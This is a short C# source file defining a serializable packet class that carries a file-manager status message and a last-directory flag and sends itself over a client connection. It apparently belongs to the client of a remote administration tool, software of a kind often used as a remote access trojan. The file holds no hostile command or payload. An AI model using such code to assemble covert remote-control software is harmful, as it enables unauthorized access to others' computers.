﻿using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class SetStatusFileManager : IPacket
    {
        public string Message { get; set; }

        public bool SetLastDirectorySeen { get; set; }

        public SetStatusFileManager()
        {
        }

        public SetStatusFileManager(string message, bool setLastDirectorySeen)
        {
            Message = message;
            SetLastDirectorySeen = setLastDirectorySeen;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}